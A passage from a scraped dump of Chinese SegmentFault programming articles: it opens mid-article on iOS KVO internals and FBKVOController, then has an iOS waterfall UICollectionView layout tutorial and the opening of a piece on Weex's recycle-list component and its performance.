<p>在调用<code>addObserver</code>方法后，<code>KVO</code>并不会对观察者进行强引用，所以需要注意观察者的生命周期，否则会导致观察者被释放带来的<code>Crash</code>。</p>
<h4>监听方法</h4>
<p>观察者需要实现<code>observeValueForKeyPath:ofObject:change:context:</code>方法，当<code>KVO</code>事件到来时会调用这个方法，如果没有实现会导致<code>Crash</code>。<code>change</code>字典中存放<code>KVO</code>属性相关的值，根据<code>options</code>时传入的枚举来返回。枚举会对应相应<code>key</code>来从字典中取出值，例如有<code>NSKeyValueChangeOldKey</code>字段，存储改变之前的旧值。</p>
<p><code>change</code>中还有<code>NSKeyValueChangeKindKey</code>字段，和<code>NSKeyValueChangeOldKey</code>是平级的关系，来提供本次更改的信息，对应<code>NSKeyValueChange</code>枚举类型的<code>value</code>。例如被观察属性发生改变时，字段为<code>NSKeyValueChangeSetting</code>。</p>
<p>如果被观察对象是集合对象，在<code>NSKeyValueChangeKindKey</code>字段中会包含<code>NSKeyValueChangeInsertion</code>、<code>NSKeyValueChangeRemoval</code>、<code>NSKeyValueChangeReplacement</code>的信息，表示集合对象的操作方式。</p>
<h4>兼容的调用方式</h4>
<p>调用<code>KVO</code>属性对象时，不仅可以通过点语法和<code>set</code>语法进行调用，<code>KVO</code>兼容很多种调用方式。</p>
<pre><code class=""objc"">// 直接调用set方法，或者通过属性的点语法间接调用
[account setName:@""Savings""];
 
// 使用KVC的setValue:forKey:方法
[account setValue:@""Savings"" forKey:@""name""];
 
// 使用KVC的setValue:forKeyPath:方法
[document setValue:@""Savings"" forKeyPath:@""account.name""];

// 通过mutableArrayValueForKey:方法获取到代理对象，并使用代理对象进行操作
Transaction *newTransaction = &lt;#Create a new transaction for the account#&gt;;
NSMutableArray *transactions = [account mutableArrayValueForKey:@""transactions""];
[transactions addObject:newTransaction];</code></pre>
<h4>实际应用</h4>
<p><code>KVO</code>主要用来做键值观察操作，想要一个值发生改变后通知另一个对象，则用<code>KVO</code>实现最为合适。斯坦福大学的<code>iOS</code>教程中有一个很经典的案例，通过<code>KVO</code>在<code>Model</code>和<code>Controller</code>之间进行通信。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013813649"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""斯坦福大学 KVO示例"" title=""斯坦福大学 KVO示例""></span></p>
<h3>注意点</h3>
<p><code>KVO</code>的<code>addObserver</code>和<code>removeObserver</code>需要是成对的，如果重复<code>remove</code>则会导致<code>NSRangeException</code>类型的<code>Crash</code>，如果忘记<code>remove</code>则会在观察者释放后再次接收到<code>KVO</code>回调时<code>Crash</code>。</p>
<p>苹果官方推荐的方式是，在<code>init</code>的时候进行<code>addObserver</code>，在<code>dealloc</code>时<code>removeObserver</code>，这样可以保证<code>add</code>和<code>remove</code>是成对出现的，是一种比较理想的使用方式。</p>
<h3>手动调用KVO</h3>
<p><code>KVO</code>在属性发生改变时的调用是自动的，如果想要手动控制这个调用时机，或想自己实现<code>KVO</code>属性的调用，则可以通过<code>KVO</code>提供的方法进行调用。</p>
<pre><code class=""objc"">- (void)setBalance:(double)theBalance {
    if (theBalance != _balance) {
        [self willChangeValueForKey:@""balance""];
        _balance = theBalance;
        [self didChangeValueForKey:@""balance""];
    }
}</code></pre>
<p>可以看到调用<code>KVO</code>主要依靠两个方法，在属性发生改变之前调用<code>willChangeValueForKey:</code>方法，在发生改变之后调用<code>didChangeValueForKey:</code>方法。</p>
<p>如果想控制当前对象的自动调用过程，也就是由上面两个方法发起的<code>KVO</code>调用，则可以重写下面方法。方法返回<code>YES</code>则表示可以调用，如果返回<code>NO</code>则表示不可以调用。</p>
<pre><code class=""objc"">+ (BOOL)automaticallyNotifiesObserversForKey:(NSString *)theKey {
    BOOL automatic = NO;
    if ([theKey isEqualToString:@""balance""]) {
        automatic = NO;
    }
    else {
        automatic = [super automaticallyNotifiesObserversForKey:theKey];
    }
    return automatic;
}</code></pre>
<h3>实现原理</h3>
<p><code>KVO</code>是通过<code>isa-swizzling</code>技术实现的(这句话是整个<code>KVO</code>实现的重点)。在运行时根据原类创建一个中间类，这个中间类是原类的子类，并动态修改当前对象的<code>isa</code>指向中间类。并且将<code>class</code>方法重写，返回原类的<code>Class</code>。所以苹果建议在开发中不应该依赖<code>isa</code>指针，而是通过<code>class</code>实例方法来获取对象类型。</p>
<h4>测试代码</h4>
<p>为了测试<code>KVO</code>的实现方式，我们加入下面的测试代码。首先创建一个<code>KVOObject</code>类，并在里面加入两个属性，然后重写<code>description</code>方法，并在内部打印一些关键参数。</p>
<pre><code class=""objc"">@interface KVOObject : NSObject
@property (nonatomic, copy  ) NSString *name;
@property (nonatomic, assign) NSInteger age;
@end

@implementation KVOObject

- (NSString *)description {
    NSLog(@""object address : %p \n"", self);
    
    IMP nameIMP = class_getMethodImplementation(object_getClass(self), @selector(setName:));
    IMP ageIMP = class_getMethodImplementation(object_getClass(self), @selector(setAge:));
    NSLog(@""object setName: IMP %p object setAge: IMP %p \n"", nameIMP, ageIMP);
    
    Class objectMethodClass = [self class];
    Class objectRuntimeClass = object_getClass(self);
    Class superClass = class_getSuperclass(objectRuntimeClass);
    NSLog(@""objectMethodClass : %@, ObjectRuntimeClass : %@, superClass : %@ \n"", objectMethodClass, objectRuntimeClass, superClass);
    
    NSLog(@""object method list \n"");
    unsigned int count;
    Method *methodList = class_copyMethodList(objectRuntimeClass, &amp;count);
    for (NSInteger i = 0; i &lt; count; i++) {
        Method method = methodList[i];
        NSString *methodName = NSStringFromSelector(method_getName(method));
        NSLog(@""method Name = %@\n"", methodName);
    }
    
    return @"""";
}</code></pre>
<p>在另一个类中分别创建两个<code>KVOObject</code>对象，其中一个对象被观察者通过<code>KVO</code>的方式监听，另一个对象则始终没有被监听。在<code>KVO</code>前后分别打印两个对象的关键信息，看<code>KVO</code>前后有什么变化。</p>
<pre><code class=""objc"">@property (nonatomic, strong) KVOObject *object1;
@property (nonatomic, strong) KVOObject *object2;

self.object1 = [[KVOObject alloc] init];
self.object2 = [[KVOObject alloc] init];
[self.object1 description];
[self.object2 description];

[self.object1 addObserver:self forKeyPath:@""name"" options:NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld context:nil];
[self.object1 addObserver:self forKeyPath:@""age"" options:NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld context:nil];

[self.object1 description];
[self.object2 description];

self.object1.name = @""lxz"";
self.object1.age = 20;</code></pre>
<p>下面是<code>KVO</code>前后打印的关键信息，我们在下面做详细分析。</p>
<pre><code class=""objc"">// 第一次
object address : 0x604000239340
object setName: IMP 0x10ddc2770 object setAge: IMP 0x10ddc27d0
objectMethodClass : KVOObject, ObjectRuntimeClass : KVOObject, superClass : NSObject
object method list
method Name = .cxx_destruct
method Name = description
method Name = name
method Name = setName:
method Name = setAge:
method Name = age

object address : 0x604000237920
object setName: IMP 0x10ddc2770 object setAge: IMP 0x10ddc27d0
objectMethodClass : KVOObject, ObjectRuntimeClass : KVOObject, superClass : NSObject
object method list
method Name = .cxx_destruct
method Name = description
method Name = name
method Name = setName:
method Name = setAge:
method Name = age

// 第二次
object address : 0x604000239340
object setName: IMP 0x10ea8defe object setAge: IMP 0x10ea94106
objectMethodClass : KVOObject, ObjectRuntimeClass : NSKVONotifying_KVOObject, superClass : KVOObject
object method list
method Name = setAge:
method Name = setName:
method Name = class
method Name = dealloc
method Name = _isKVOA

object address : 0x604000237920
object setName: IMP 0x10ddc2770 object setAge: IMP 0x10ddc27d0
objectMethodClass : KVOObject, ObjectRuntimeClass : KVOObject, superClass : NSObject
object method list
method Name = .cxx_destruct
method Name = description
method Name = name
method Name = setName:
method Name = setAge:
method Name = age</code></pre>
<p>我们发现对象被<code>KVO</code>后，其真正类型变为了<code>NSKVONotifying_KVOObject</code>类，已经不是之前的类了。<code>KVO</code>会在运行时动态创建一个新类，将对象的<code>isa</code>指向新创建的类，新类是原类的子类，命名规则是<code>NSKVONotifying_xxx</code>的格式。<code>KVO</code>为了使其更像之前的类，还会将对象的<code>class</code>实例方法重写，使其更像原类。</p>
<p>在上面的代码中还发现了<code>_isKVOA</code>方法，这个方法可以当做使用了<code>KVO</code>的一个标记，系统可能也是这么用的。如果我们想判断当前类是否是<code>KVO</code>动态生成的类，就可以从方法列表中搜索这个方法。</p>
<h4>重写setter方法</h4>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013813650"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""KVO调用栈"" title=""KVO调用栈""></span></p>
<p><code>KVO</code>会重写<code>keyPath</code>对应属性的<code>setter</code>方法，没有被<code>KVO</code>的属性则不会重写其<code>setter</code>方法。在重写的<code>setter</code>方法中，修改值之前会调用<code>willChangeValueForKey:</code>方法，修改值之后会调用<code>didChangeValueForKey:</code>方法，这两个方法最终都会被调用到<code>observeValueForKeyPath:ofObject:change:context:</code>方法中。</p>
<h4>object_getClass</h4>
<p>为什么上面调用<code>runtime</code>的<code>object_getClass</code>函数，就可以获取到真正的类呢？</p>
<p>调用<code>object_getClass</code>函数后其返回的是一个<code>Class</code>类型，<code>Class</code>是<code>objc_class</code>定义的一个<code>typedef</code>别名，通过<code>objc_class</code>就可以获取到对象的<code>isa</code>指针指向的<code>Class</code>，也就是对象的类对象。</p>
<p>由此可以推测，<code>object_getClass</code>函数内部返回的是对象的<code>isa</code>指针。</p>
<pre><code class=""objc"">typedef struct objc_class *Class;

struct objc_class {
    Class _Nonnull isa  OBJC_ISA_AVAILABILITY;

#if !__OBJC2__
    Class _Nullable super_class                              OBJC2_UNAVAILABLE;
    const char * _Nonnull name                               OBJC2_UNAVAILABLE;
    long version                                             OBJC2_UNAVAILABLE;
    long info                                                OBJC2_UNAVAILABLE;
    long instance_size                                       OBJC2_UNAVAILABLE;
    struct objc_ivar_list * _Nullable ivars                  OBJC2_UNAVAILABLE;
    struct objc_method_list * _Nullable * _Nullable methodLists                    OBJC2_UNAVAILABLE;
    struct objc_cache * _Nonnull cache                       OBJC2_UNAVAILABLE;
    struct objc_protocol_list * _Nullable protocols          OBJC2_UNAVAILABLE;
#endif
}</code></pre>
<h3>缺点</h3>
<p>苹果提供的<code>KVO</code>自身存在很多问题，首要问题在于，<code>KVO</code>如果使用不当很容易崩溃。例如重复<code>add</code>和<code>remove</code>导致的<code>Crash</code>，<code>Observer</code>被释放导致的崩溃，<code>keyPath</code>传错导致的崩溃等。</p>
<p>在调用<code>KVO</code>时需要传入一个<code>keyPath</code>，由于<code>keyPath</code>是字符串的形式，所以其对应的属性发生改变后，字符串没有改变容易导致<code>Crash</code>。我们可以利用系统的反射机制将<code>keyPath</code>反射出来，这样编译器可以在<code>@selector()</code>中进行合法性检查。</p>
<pre><code class=""objc"">NSStringFromSelector(@selector(isFinished))</code></pre>
<p><code>KVO</code>是一种事件绑定机制的实现，在<code>keyPath</code>对应的值发生改变后会回调对应的方法。这种数据绑定机制，在对象关系很复杂的情况下，很容易导致不好排查的<code>bug</code>。例如<code>keyPath</code>对应的属性被调用的关系很复杂，就不太建议对这个属性进行<code>KVO</code>，可以想一下<code>RAC</code>的信号脑补一下。</p>
<h3>自己实现KVO</h3>
<p>除了上面的缺点，<code>KVO</code>还不支持<code>block</code>语法，需要单独重写父类方法，这样加上<code>add</code>和<code>remove</code>方法就会导致代码很分散。所以，我通过<code>runtime</code>简单的实现了一个<code>KVO</code>，源码放在我的<code>Github</code>上，叫做<a href=""https://github.com/DeveloperErenLiu/EasyKVO"" rel=""nofollow noreferrer"">EasyKVO</a>。</p>
<pre><code class=""objc"">self.object1 = [[KVOObject alloc] init];
[self.object1 lxz_addObserver:self originalSelector:@selector(name) callback:^(id observedObject, NSString *observedKey, id oldValue, id newValue) {
    // callback
}];

self.object1.name = @""lxz"";
[self.object1 lxz_removeObserver:self originalSelector:@selector(name)];</code></pre>
<p>调用代码很简单，直接通过<code>lxz_addObserver:originalSelector:callback:</code>方法就可以添加<code>KVO</code>的监听，可以通过<code>callback</code>的<code>block</code>接收属性发生改变后的回调，而且方法的<code>keyPath</code>接收的是一个<code>SEL</code>类型参数，所以可以通过<code>@selector()</code>传入参数时进行方法合法性检查，如果是未实现的方法直接就会报警告。</p>
<p>通过<code>lxz_removeObserver:originalSelector:</code>方法传入观察者和<code>keyPath</code>，当观察者所有<code>keyPath</code>都移除后则从<code>KVO</code>中移除观察者对象。</p>
<p>如果重复<code>addObserver</code>和<code>removeObserver</code>也没事，内部有判断逻辑。<code>EasyKVO</code>内部通过<code>weak</code>对观察者做引用，并不会影响观察者的生命周期，并且在观察者释放后不会导致<code>Crash</code>。一次<code>add</code>方法调用对应一个<code>block</code>，如果观察者监听多个<code>keyPath</code>属性，不需要在<code>block</code>回调中判断<code>keyPath</code>。</p>
<h5>注意</h5>
<p>需要注意的是，<code>EasyKVO</code>只是做技术交流，不建议在项目中使用。因为<code>KVO</code>实现需要考虑很多情况，继承关系、多个观察者等很多问题。</p>
<h3>KVOController</h3>
<p>想在项目中安全便捷的使用<code>KVO</code>的话，推荐<code>Facebook</code>的一个<code>KVO</code>开源第三方框架-<a href=""https://github.com/facebook/KVOController"" rel=""nofollow noreferrer"">KVOController</a>。<code>KVOController</code>本质上是对系统<code>KVO</code>的封装，具有原生<code>KVO</code>所有的功能，而且规避了原生<code>KVO</code>的很多问题，兼容<code>block</code>和<code>action</code>两种回调方式。</p>
<h4>源码分析</h4>
<p>从源码来看还是比较简单的，主要分为<code>NSObject</code>的<code>Category</code>和<code>FBKVOController</code>两部分。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013813651"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""FBKVOController"" title=""FBKVOController""></span></p>
<p>在<code>Category</code>中提供了<code>KVOController</code>和<code>KVOControllerNonRetaining</code>两个属性，顾名思义第一个会对<code>observer</code>产生强引用，第二个则不会。其内部代码就是创建<code>FBKVOController</code>对象的代码，并将创建出来的对象赋值给<code>Category</code>的属性，直接通过这个<code>Category</code>就可以懒加载创建<code>FBKVOController</code>对象。</p>
<pre><code class=""objc"">- (FBKVOController *)KVOControllerNonRetaining
{
  id controller = objc_getAssociatedObject(self, NSObjectKVOControllerNonRetainingKey);
  
  if (nil == controller) {
    controller = [[FBKVOController alloc] initWithObserver:self retainObserved:NO];
    self.KVOControllerNonRetaining = controller;
  }
  
  return controller;
}</code></pre>
<h4>FBKVOController部分</h4>
<p>在<code>FBKVOController</code>中分为三部分，<code>_FBKVOInfo</code>是一个私有类，这个类的功能很简单，就是以结构化的形式保存<code>FBKVOController</code>所需的各个对象，类似于模型类的功能。</p>
<p>还有一个私有类<code>_FBKVOSharedController</code>，这是<code>FBKVOController</code>框架实现的关键。从命名上可以看出其是一个单例，所有通过<code>FBKVOController</code>实现的<code>KVO</code>，观察者都是它。每次通过<code>FBKVOController</code>添加一个<code>KVO</code>时，<code>_FBKVOSharedController</code>都会将自己设为观察者，并在其内部实现<code>observeValueForKeyPath:ofObject:change:context:</code>方法，将接收到的消息通过<code>block</code>或<code>action</code>进行转发。</p>
<p>其功能很简单，通过<code>observe:info:</code>方法添加<code>KVO</code>监听，并用一个<code>NSHashTable</code>保存<code>_FBKVOInfo</code>信息。通过<code>unobserve:info:</code>方法移除监听，并从<code>NSHashTable</code>中将对应的<code>_FBKVOInfo</code>移除。这两个方法内部都会调用系统的<code>KVO</code>方法。</p>
<p>在外界使用时需要用<code>FBKVOController</code>类，其内部实现了初始化以及添加和移除监听的操作。在调用添加监听方法后，其内部会创建一个<code>_FBKVOInfo</code>对象，并通过一个<code>NSMapTable</code>对象进行持有，然后会调用<code>_FBKVOSharedController</code>来进行注册监听。</p>
<p>使用<code>FBKVOController</code>的话，不需要手动调用<code>removeObserver</code>方法，在被监听对象消失的时候，会在<code>dealloc</code>中调用<code>remove</code>方法。如果因为业务需求，可以手动调用<code>remove</code>方法，重复调用<code>remove</code>方法不会有问题。</p>
<pre><code class=""objc"">- (void)_observe:(id)object info:(_FBKVOInfo *)info
{
    NSMutableSet *infos = [_objectInfosMap objectForKey:object];

    _FBKVOInfo *existingInfo = [infos member:info];
    if (nil != existingInfo) {
      return;
    }

    if (nil == infos) {
      infos = [NSMutableSet set];
      [_objectInfosMap setObject:infos forKey:object];
    }

    [infos addObject:info];

    [[_FBKVOSharedController sharedController] observe:object info:info];
}</code></pre>
<p>因为<code>FBKVOController</code>的实现很简单，所以这里就很简单的讲讲，具体实现可以去<a href=""https://github.com/facebook/KVOController"" rel=""nofollow noreferrer"">Github</a>下载源码仔细分析一下。</p>

                ", KVO原理分析及使用进阶,1531971883,270,1,406,1,1,https://segmentfault.com/a/1190000013813643
22,1,0,6,"
                    
<h1>iOS开发：瀑布流的实现</h1>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013704220?w=318&amp;h=585"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>效果的实现，主要是对UICollectionViewLayout进行封装，我的.h文件中：</p>
<pre><code>#import &lt;UIKit/UIKit.h&gt;
@class CustomeViewLayout;
@protocol CustomViewLayoutDelegate &lt;NSObject&gt;

/**
 计算item高度的代理方法，将item的高度与indexPath传给外界
 */
- (CGFloat)customFallLayout:(CustomeViewLayout *)customFallLayout itemHeightForWidth:(CGFloat)itemWidth atIndexPath:(NSIndexPath *)indexPath;

@end

//实现了瀑布流功能，但是不能添加头部和底部视图，如项目中有添加头部或底部视图的需求，请慎用！！！
@interface CustomeViewLayout : UICollectionViewLayout

/**
 总列数，默认是2
 */
@property (nonatomic, assign) NSInteger columnCount;

/**
 列间距，默认是0
 */
@property (nonatomic, assign) float columnSpacing;

/**
 行间距，默认是0
 */
@property (nonatomic, assign) float rowSpacing;

/**
 section与CollectionView的间距，上、左、下、右，默认是(0, 0, 0, 0)
 */
@property (nonatomic, assign) UIEdgeInsets sectionInset;

/**
 同时设置列间距、行间距、sectionInset

 @param columnSpacing 列间距
 @param rowSpacing 行间距
 @param sectionInset 设置上、左、下、右的距离
 */
- (void)setColumnSpacing:(float)columnSpacing rowSpacing:(float)rowSpacing sectionInset:(UIEdgeInsets)sectionInset;

#pragma mark ====== 代理方法、block二选其一 ======
/**
 一下代理属性与block属性二选其一，用来设置每一个item的高度
 会将item的高度与indexPath传递给外界
 如果两个都设置，block的优先级高，即代理无效
 */

/**
 代理方法，用来计算item的高度
 */
@property (nonatomic, assign) id&lt;CustomViewLayoutDelegate&gt; delegate;

/**
 计算item高度的block，将item的高度与indexPath传递给外界
 */
@property (nonatomic, strong) CGFloat(^itemHeightBlock)(CGFloat itemHeight, NSIndexPath *indexPath);

#pragma mark ====== 构造方法 ======
+ (instancetype)customFallLayoutWithColumnCount:(float)columnCount;
- (instancetype)initWithColumCount:(float)columnCount;

@end</code></pre>
<p>上面的文件主要是给外界提供一个接口，可以设置行数、行间距、列间距</p>
<p>实现的文件中，主要是找到UICollectionView中，最短的列数的最大Y值，把后面需要添加的item添加到这一列的下面，主要代码如下：</p>
<pre><code>- (UICollectionViewLayoutAttributes *)layoutAttributesForItemAtIndexPath:(NSIndexPath *)indexPath {
    //根据indexPath获取item的attributes
    UICollectionViewLayoutAttributes *attributes = [UICollectionViewLayoutAttributes layoutAttributesForCellWithIndexPath:indexPath];
    
    //获取collectionView的宽度
    CGFloat collectionViewWidth = self.collectionView.frame.size.width;
    
    //item的宽度 = (collectionView的宽度 - 内边距与列间距) / 列数
    CGFloat itemWidth = (collectionViewWidth - self.sectionInset.left - self.sectionInset.right - (self.columnCount - 1) * self.columnSpacing) / self.columnCount;
    
    CGFloat itemHeight = 0;
    //获取item的高度，由外界计算得到
    if (self.itemHeightBlock) {
        itemHeight = self.itemHeightBlock(itemWidth, indexPath);
    } else {
        if ([self.delegate respondsToSelector:@selector(customFallLayout:itemHeightForWidth:atIndexPath:)]) {
            itemHeight = [self.delegate customFallLayout:self itemHeightForWidth:itemWidth atIndexPath:indexPath];
        }
    }
    
    //找出最短的那一列
    __block NSNumber *minIndex = @0;
    [self.maxYDic enumerateKeysAndObjectsUsingBlock:^(NSNumber *key, NSNumber *obj, BOOL *stop) {
        if ([self.maxYDic[minIndex] floatValue] &gt; obj.floatValue) {
            minIndex = key;
        }
    }];
    
    //根据最短列的列数计算item的x值
    CGFloat itemX = self.sectionInset.left + (self.columnSpacing + itemWidth) * minIndex.integerValue;
    
    //item的y值 = 最短列的最大y值 + 行间距
    CGFloat itemY = [self.maxYDic[minIndex] floatValue] + self.rowSpacing;
    
    //设置attributes的frame
    attributes.frame = CGRectMake(itemX, itemY, itemWidth, itemHeight);
    
    //更新字典中的最大y值
    self.maxYDic[minIndex] = @(CGRectGetMaxY(attributes.frame));
    
    return attributes;
}</code></pre>
<p>具体实现请看demo，<br><a href=""http://www.code4app.com/blog-928210-1900.html"" rel=""nofollow noreferrer"">demo下载地址</a></p>

                ", iOS开发：瀑布流效果的实现(使用UICollectionView),1531971885,496,1,982,1,1,https://segmentfault.com/a/1190000013704217
23,1,0,6,"
                    
<p>关注 Weex 开发进展的同学，可能会知道 Weex 前段时间发布了 v0.18.0 版本（<a href=""http://weex-project.io/releasenote.html#v0-18-0"" rel=""nofollow noreferrer"">release note</a>），其中包含了一个叫 <code>&lt;recycle-list&gt;</code> 的组件，它是一个带有回收复用功能的列表容器，据说是有史以来最特别的组件，性能也有大幅提升，开发过程也涉及到很多底层的改造，陆陆续续花了半年才实现了第一个正式的版本。<a href=""http://weex-project.io/cn/references/components/recycle-list.html"" rel=""nofollow noreferrer""><code>&lt;recycle-list&gt;</code> 的文档</a>也在官网上线了，不过整体看下来好像和普通的 <code>&lt;list&gt;</code> 也差不多，反而多了一大堆莫名其妙的注意事项，一副很敏感又很脆弱的样子，真的有那么好用吗？这篇文章里就好好聊一聊它的特别之处。</p>
<h2>为什么要搞个新的列表容器</h2>
<p>在如今 App 的开发中，有大部分的页面都是以可滚动列表的形式展现的，尤其是在货架式琳琅满目的活动页面中，更是长列表的主场，而且越来越长，带上“懒加载”和“自动加载更多”以后，其实就是一个可以无限滚动的列表。所以说，列表的性能和体验往往从很大程度上决定了页面的性能和体验，优化了列表的性能就会大幅提高页面的性能。</p>
<p>Weex 目前提供的列表组件 <a href=""http://weex-project.io/cn/references/components/list.html"" rel=""nofollow noreferrer""><code>&lt;list&gt;</code></a> 其实已经是功能很强大的一个组件了，在 Android 上使用的是 <code>RecyclerView</code> 组件，在 iOS 上使用的是 <code>UITableView</code>，本身就具有了操作系统原生提供的回收功能，在节点离屏时可以回收掉部分原生组件持有的内存。和 Web 中的开发技术相比，在 webview 中实现的列表，无论是渲染性能、滚动体验还是内存占用方面，都难以和原生列表相媲美。即便如此，性能也永远是值得优化的，使用 Weex 的开发者对列表性能的追求也是永无止境的。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV5Du6?w=2128&amp;h=1408"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>就像大家觉得前端框架引入 Virtual DOM 之后就一定比原生 DOM 慢一样，一些 Weex 的原生开发者也觉得 Weex 提供的列表毕竟多了一层封装，不能精细地操控列表的渲染行为，性能一定不如直接操作原生列表。这也是有一定道理的，如果再仔细分析一下这些需求，到底如何精细操控列表的渲染行为能提升性能呢？有没有办法抽象出通用的逻辑呢？假如说不考虑兼容现有的 list 组件，也允许对框架和现有渲染流程做重构级别的改动，能不能开个脑洞放个大招来提升列表的性能呢？这也是要开发新列表容器的出发点。</p>
<h2>有啥不一样</h2>
<p>既然名字叫 recycle-list，它与普通 list 的最大差异就在于节点的回收复用能力。</p>
<p>在大部分使用列表的场景中，有很多行节点的结构都是大致相同的，一个列表可能有 500 行那么长，全部展开的话长度会超过 100 屏，但是很可能只用了 5 个不同的模板。如果在渲染这 500 行节点的时候，能不断复用这 5 个模板结构的话，只渲染可视区内的组件的话，肯定能大幅优化列表的渲染性能。</p>
<p>所以在渲染 recycle-list 的时候，会记录不同的模板结构，用数据驱动模板的渲染，首次渲染时只会先创建首屏以及有可能滚动到的安全区域内的节点；在滚动时，会将脱离安全区域内的节点回收，清空模板并灌注新数据追加到即将出现的区域内。这是 recycle-list 在渲染行为上最大的不同。基于这种行为，前端和客户端之间节点的通信数据量将会减少，列表的内存也可以得到大幅的优化，即使列表越来越长，内存的增量也不会很多。</p>
<h3>常规列表的渲染过程</h3>
<p>首先分析一下目前在 Weex 里常规组件的渲染流程是怎样的。</p>
<blockquote>在 Weex 的架构中，可以简略的分成三层：【DSL】-&gt;【JS Framework】-&gt;【原生渲染引擎】。其中 DSL (Domain Specific Language) 指的是 Weex 里支持的上层前端框架，即 Vue 和 Rax。原生渲染引擎就是在 Weex 支持的平台上（Android 或 iOS）绘制原生 UI 的引擎。JS Framework 是桥接并适配 DSL 和原生渲染引擎的一层。参考 <a href=""https://segmentfault.com/a/1190000013388649"" rel=""nofollow noreferrer"">《详细介绍 Weex 的 JS Framework》</a>。</blockquote>
<p>常规组件的渲染过程可以分为如下这几个步骤：</p>
<ol>
<li>创建前端组件</li>
<li>构建 Virtual DOM</li>
<li>生成“真实” DOM</li>
<li>发送渲染指令</li>
<li>绘制原生 UI</li>
</ol>
<p>以 Vue.js 为例，它在 Weex 里的渲染过程可以用下面这一张图来概括：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k5L?w=2711&amp;h=1080"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>简而言之，模板是可以被复用的，传入多条数据可以展开成多个前端组件，这也是组件化的优势之一，组件进一步在前端框架中展开成 VNode 节点。JS Framework 里提供了很多类似 DOM API 的接口，在内部构建出适用于 Weex 平台的 <code>Element</code> 节点（和 DOM 很像，但并不是“真实”的 DOM），这些节点会以渲染指令的形式发给客户端。客户端根据渲染指令创建相应的原生组件，最终调用系统提供的接口绘制原生 UI。具体过程请参考：<a href=""https://segmentfault.com/a/1190000013388649#articleHeader10"" rel=""nofollow noreferrer""><em>Weex 页面的渲染</em></a>。</p>
<h3>改造思路</h3>
<p>回顾上述过程可以看出，组件的模板结构是可复用的，这也是组件化的优势之一，但是组件的展开发生在前端框架内部，在传递到客户端的过程中，节点的结构保留了，但是组件的信息都被过滤掉了。即使同一个组件使用两份数据来渲染，生成了两份结构一致只有小部分内容有差异的节点，客户端也不会认为他们之间有联系，依然彼此独立的渲染。也就是说，在常规组件的渲染流程中，客户端感知不到前端组件的概念，渲染粒度太小，难以复用。</p>
<p>借鉴函数式编程里的惰性计算的思路，可以将渲染过程延后，交给客户端执行，这样客户端就能更好的施展复用逻辑。具体来讲就是不把节点在前端渲染好了再把结果发给客户端，而是把“渲染方法”和数据分别发给客户端，避免模板在前端框架中展开，客户端根据数据和用户的操作行为控制模板的渲染和复用。</p>
<h3>可复用列表的渲染过程</h3>
<p><span class=""img-wrap""><img data-src=""/img/bV5DoH?w=1920&amp;h=1080"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>如上图所示，前端框架中的 <code>Template</code> 不再需要数据，而是直接展开成一种纯静态的模板结构，结构中包含了模板渲染逻辑，格式仍然是 <code>VNode</code>。然后经过 JS Framework 转换成 Weex 支持的 <code>Element</code>，其中也包含了模板的原生渲染指令。客户端解析出可复用的模板结构，由数据驱动模板渲染，这个模板结构和前端组件中的定义是一致的。</p>
<p>这个过程除了要把模板发给客户端，还得带上模板的渲染逻辑，告诉客户端如何根据数据来渲染模板。为了描述这些渲染逻辑，就得设计一套面向原生渲染引擎的模板渲染指令，用来声明节点的循环渲染、条件渲染、事件绑定等逻辑。下文有详解。</p>
<h2>性能对比</h2>
<p>上述改造过程如果能实现的话，从理论上上讲，内存和渲染性能必然会有提升，而且列表越长性能优势越明显。下面也从实际的数据中看一下性能的对比结果到底是怎样的。</p>
<p>目前 Weex 提供了 <code>&lt;scroller&gt;</code> 、 <code>&lt;list&gt;</code> 、 和 <code>&lt;recycle-list&gt;</code> 这三种可滚动容器，功能看起来差不多，但是能力和特征都有差异。为了方便比较性能，我们对同样的一个页面，分别使用了不同的列表容器来实现，并记录了在 iOS 和 Android 下页面的加载时间、进入页面时的内存、滑动到页面底部时的内存、滑动时CPU的使用量等数据。</p>
<p>使用的测试用例如下：</p>
<ul>
<li>
<a href=""http://dotwe.org/vue/9bce1225edd7c9d4d08a9c117e8d9b34"" rel=""nofollow noreferrer"">使用 <code>&lt;scroller&gt;</code></a>。</li>
<li>
<a href=""http://dotwe.org/vue/559d505aa40afcaa8544df275c2ae695"" rel=""nofollow noreferrer"">使用 <code>&lt;list&gt;</code></a>。</li>
<li>
<a href=""http://dotwe.org/vue/b1a139c6965f2ef5c06118e58203eb60"" rel=""nofollow noreferrer"">使用 <code>&lt;recycle-list&gt;</code></a> （需要使用<a href=""http://weex-project.io/tools/playground.html"" rel=""nofollow noreferrer"">最新版 playground app</a> 扫码才能看到渲染效果）。</li>
</ul>
<p>在 iOS 设备（iPhone 6, iOS 11.0）中的测试结果如下所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV5DoR?w=1920&amp;h=815"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>在 Android 设备（Honor 6x, Android 7.0）中的测试结果如下所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV5Do2?w=1920&amp;h=815"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
